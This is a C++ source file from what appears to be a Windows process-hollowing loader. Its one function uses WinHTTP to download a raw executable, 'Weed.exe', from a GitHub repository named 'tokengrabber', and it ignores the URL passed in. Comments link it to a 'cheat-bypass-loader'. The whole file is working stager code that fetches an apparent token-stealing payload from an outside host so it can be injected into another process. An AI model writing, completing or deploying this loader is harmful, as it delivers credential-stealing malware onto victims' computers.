#include "../include/Network.h"
#include <windows.h>
#include <winhttp.h>

#pragma comment(lib, "winhttp.lib")

// =============================================================================
// Network::DownloadPE - baixa PE cru via HTTPS do raw.githubusercontent.com.
    // Mesma URL usada pelo cheat-bypass-loader (DownloadWeedFromGitHub).
// =============================================================================

namespace Hollowing {

    bool Network::DownloadPE(const std::string& /*ignored*/, std::vector<BYTE>& outData) {
        const wchar_t* host = L"raw.githubusercontent.com";
        const wchar_t* path = L"/bielzxdev/tokengrabber/refs/heads/main/Weed.exe";
        const wchar_t* ua   = L"Mozilla/5.0";

        HINTERNET hSess = WinHttpOpen(ua, WINHTTP_ACCESS_TYPE_NO_PROXY, nullptr, nullptr, 0);
        if (!hSess) return false;

        HINTERNET hConn = WinHttpConnect(hSess, host, INTERNET_DEFAULT_HTTPS_PORT, 0);
        if (!hConn) { WinHttpCloseHandle(hSess); return false; }

        HINTERNET hReq = WinHttpOpenRequest(hConn, L"GET", path, nullptr,
                                            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
                                            WINHTTP_FLAG_SECURE);
        if (!hReq) {
            WinHttpCloseHandle(hConn);
            WinHttpCloseHandle(hSess);
            return false;
        }

        if (!WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
            !WinHttpReceiveResponse(hReq, nullptr))
        {
            WinHttpCloseHandle(hReq);
            WinHttpCloseHandle(hConn);
            WinHttpCloseHandle(hSess);
            return false;
        }

        BYTE chunk[8192];
        DWORD got = 0;
        while (WinHttpReadData(hReq, chunk, sizeof(chunk), &got) && got > 0) {
            outData.insert(outData.end(), chunk, chunk + got);
        }

        WinHttpCloseHandle(hReq);
        WinHttpCloseHandle(hConn);
        WinHttpCloseHandle(hSess);
        return !outData.empty();
    }
}
